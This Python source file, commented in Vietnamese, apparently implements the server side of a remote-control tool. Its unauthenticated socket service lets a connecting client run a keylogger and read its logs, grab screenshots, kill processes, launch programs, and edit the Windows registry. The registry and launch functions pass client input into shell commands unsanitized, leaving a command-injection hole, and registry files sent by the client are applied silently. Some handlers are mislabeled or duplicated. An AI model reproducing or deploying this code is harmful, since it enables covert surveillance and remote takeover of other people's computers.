import io
import os
import json
import psutil
import socket
import threading
import subprocess
from PIL import ImageGrab  # Để chụp màn hình
from keylogger import Keylogger
from shutdown import ServerShutdownWindow
import psutil

class Server:
    def __init__(self):
        self.server_ip = ""
        self.socket = None
        self.running = False
        self.cache_path = "tmp_files"
        self.keylogger = Keylogger(os.path.join(self.cache_path), "keylog.txt")
        self.client_threads = []

    def stop_server(self):
        self.running = False
        if self.socket:
            self.socket.close()
        for client_thread in self.client_threads:
            client_thread.join()
        self.keylogger.stop()


    def start_server(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.server_ip, 12345))
        self.socket.listen(1)
        print("Server đang chạy và lắng nghe kết nối.")
        self.running = True
        while self.running:
            try:
                client_socket, client_address = self.socket.accept()
                print(f"Đã kết nối từ {client_address[0]}:{client_address[1]}")

                # Tạo một luồng riêng để xử lý tin nhắn từ client
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
                self.client_threads.append(client_thread)

            except OSError:
                if not self.running:
                    break
                else:
                    raise

    def handle_client(self, client_socket):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                data = data.decode()
                response = self.process_request(data, client_socket)
                if response is not None:
                    client_socket.sendall(response.encode())
        except Exception as e:
            print(f"Lỗi xử lý yêu cầu từ client: {str(e)}")
        finally:
            client_socket.close()

    def process_request(self, request, client_socket):
        if request == "start":
            self.keylogger.start()
            return ""
        elif request == "stop":
            self.keylogger.stop()
            return ""
        elif request == "clear":
            self.keylogger.clear_log()
            return ""
        elif request == "print":
            logs = self.keylogger.read_log()
            return logs
        elif request == "screenshot":
            # Thực hiện chụp màn hình và gửi hình ảnh về máy khách
            screenshot = self.capture_screenshot()
            client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
            client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
            return None  # Không cần trả về gì ở đây
        elif request == "shutdown":
            shutdown_window = ServerShutdownWindow(self)
            shutdown_window.start()
            return "Server đã tắt"
        elif request == "apps":
            apps = self.get_running_applications()
            return json.dumps(apps)
        elif request == "processus":
            process_result = self.handle_processus_request(client_socket)
            return "processing" 
        elif request.startswith("kill"):
            try:
                _, pid_str = request.split(" ", 1)  # Tách lệnh và PID
                pid = int(pid_str)  # Chuyển PID thành số nguyên
                return self.kill(pid)
            except ValueError:
                return "Invalid PID."
        elif request.startswith("start"):
            try:
                _, app_name = request.split(" ", 1)  # Tách lệnh và tên ứng dụng
                subprocess.Popen(["start", app_name], shell=True)
                return f"Started application: {app_name}"
            except ValueError:
                return "Invalid application name."
        elif request == "registry patch":
            response = self.handle_registry_patch(client_socket)
            return response
        elif request.startswith("get"):
            try:
                _, key_path, value_name = request.split(" ", 2)  # Tách lệnh, đường dẫn, và tên giá trị
                result = self.get_registry_value(key_path, value_name)
                return result
            except ValueError:
                return "Invalid get request."
        elif request.startswith("set"):
            try:
                _, key_path, value_name, value_data, value_type = request.split(" ", 4)  # Tách lệnh, đường dẫn, tên giá trị, dữ liệu giá trị, và kiểu giá trị
                result = self.set_registry_value(key_path, value_name, value_data, value_type)
                return result
            except ValueError:
                return "Invalid set request."
        elif request.startswith("delete"):
            try:
                _, key_path, value_name = request.split(" ", 2)  # Tách lệnh, đường dẫn, và tên giá trị
                result = self.delete_registry_value(key_path, value_name)
                return result
            except ValueError:
                return "Invalid delete request."
        elif request.startswith("create_key"):
            try:
                _, key_path = request.split(" ", 1)  # Tách lệnh và đường dẫn khóa
                result = self.create_registry_key(key_path)
                return result
            except ValueError:
                return "Invalid create_key request."
        elif request.startswith("delete_key"):
            try:
                _, key_path = request.split(" ", 1)  # Tách lệnh và đường dẫn khóa
                result = self.delete_registry_key(key_path)
                return result
            except ValueError:
                return "Invalid delete_key request."
        else:
            return "Invalid request."
    #create, delete key registry
    def create_registry_key(self, key_path):
        try:
            # Sử dụng subprocess để chạy reg add để tạo khóa trong Registry
            command = f'reg add "{key_path}" /f'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return f"Registry key {key_path} created successfully."
            else:
                return result.stderr
        except Exception as e:
            return f"Error creating registry key: {str(e)}"

    def delete_registry_key(self, key_path):
        try:
            # Sử dụng subprocess để chạy reg delete để xóa khóa khỏi Registry
            command = f'reg delete "{key_path}" /f'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return f"Registry key {key_path} deleted successfully."
            else:
                return result.stderr
        except Exception as e:
            return f"Error deleting registry key: {str(e)}"
    #get,setcreate value registry
    def get_registry_value(self, key_path, value_name):
        try:
            # Sử dụng subprocess để chạy reg query để lấy giá trị từ Registry
            command = f'reg query "{key_path}" /v "{value_name}"'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return result.stdout
            else:
                return result.stderr
        except Exception as e:
            return f"Error getting registry value: {str(e)}"

    def set_registry_value(self, key_path, value_name, value_data, value_type):
        try:
            # Sử dụng subprocess để chạy reg add để thiết lập giá trị trong Registry
            command = f'reg add "{key_path}" /v "{value_name}" /d "{value_data}" /t {value_type} /f'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return f"Registry value {value_name} set successfully."
            else:
                return result.stderr
        except Exception as e:
            return f"Error setting registry value: {str(e)}"

    def delete_registry_value(self, key_path, value_name):
        try:
            # Sử dụng subprocess để chạy reg delete để xóa giá trị khỏi Registry
            command = f'reg delete "{key_path}" /v "{value_name}" /f'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return f"Registry value {value_name} deleted successfully."
            else:
                return result.stderr
        except Exception as e:
            return f"Error deleting registry value: {str(e)}"
    # handle registry patch
    def handle_registry_patch(self, client_socket):
        try:
            print("Đang nhận dữ liệu registry patch từ client...")
            registry_data = b""

            # Nhận và ghi dữ liệu từ client
            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                registry_data += chunk

            # Lưu dữ liệu vào tệp tin registry
            with open(os.path.join(self.cache_path, "registry.reg"), "wb") as reg_file:
                reg_file.write(registry_data)

            print("Đã nhận và lưu registry patch thành công.")
            return "Registry patch applied successfully."

        except Exception as e:
            print(f"Lỗi xử lý registry patch: {str(e)}")
            return f"Error applying registry patch: {str(e)}"

    # kill process
    def kill(self, pid):
        try:
            process = psutil.Process(pid)
            process.terminate()  # Kết thúc quy trình
            return f"Process with PID {pid} terminated."
        except psutil.NoSuchProcess:
                return "Process not found."
    
    # screenshot   
    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            image_byte_array = io.BytesIO()
            screenshot.save(image_byte_array, format="PNG")
            return image_byte_array.getvalue()
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}"
    # running process
   
    def get_running_processus(self):
        try:
            # Sử dụng PowerShell để lấy thông tin về tiến trình và số luồng
            powershell_command = "Get-Process | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

            # Phân tích kết quả JSON
            processes = json.loads(result.stdout)

            # Tạo danh sách mới chứa thông tin về số luồng của từng tiến trình
            processus = []

            for process in processes:
                process_name = process['ProcessName']
                pid = process['Id']
                thread_count = len(process['Threads'])
        
                # Thêm thông tin vào danh sách mới
                processus.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
           
            return processus

        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return []
        
    # running apps, same as process
    def get_running_applications(self):
        try:
            # Sử dụng PowerShell để lấy thông tin về tiến trình, tiêu đề cửa sổ chính, và thread count
            powershell_command = "Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

            # Phân tích kết quả JSON
            processes = json.loads(result.stdout)

            # Tạo danh sách mới chứa thông tin về tiêu đề cửa sổ chính và thread count của từng tiến trình
            apps_list = []

            for process in processes:
                process_name = process['ProcessName']
                pid = process['Id']
                thread_count = len(process['Threads'])

                # Thêm thông tin vào danh sách mới
                apps_list.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
            print(apps_list)
            return apps_list

        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return []

    def handle_processus_request(self, client_socket):
        try:
            print("Đang nhận dữ liệu registry patch từ client...")
            registry_data = b""

            # Nhận và ghi dữ liệu từ client
            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                registry_data += chunk

            # Lưu dữ liệu vào tệp tin registry
            reg_file_path = os.path.join(self.cache_path, "registry.reg")
            with open(reg_file_path, "wb") as reg_file:
                reg_file.write(registry_data)

            print("Đã nhận và lưu registry patch thành công.")

            # Sử dụng subprocess để chạy regedit và áp dụng thay đổi
            subprocess.Popen(['regedit', '/s', reg_file_path], shell=True)

            return "Registry patch applied successfully."

        except Exception as e:
            error_message = str(e)
            self.send_packet(client_socket, error_message)  # Gửi thông báo lỗi đến client

        # finally:
        #     client_socket.close()  # Đảm bảo đóng kết nối khi xong việc xử lý
    
    def send_packet(self, client_socket, packet):
        try:
            client_socket.send(packet.encode())
        except Exception as e:
            print(f"Error sending packet: {str(e)}")

    def registry_patch(self, reg_file_path):
        try:
            subprocess.Popen(['regedit', '/s', reg_file_path], shell=True)
            return "Registry patch applied successfully."
        except Exception as e:
            return f"Error applying registry patch: {str(e)}"


if __name__ == "__main__":
    server = Server()
    server.start_server()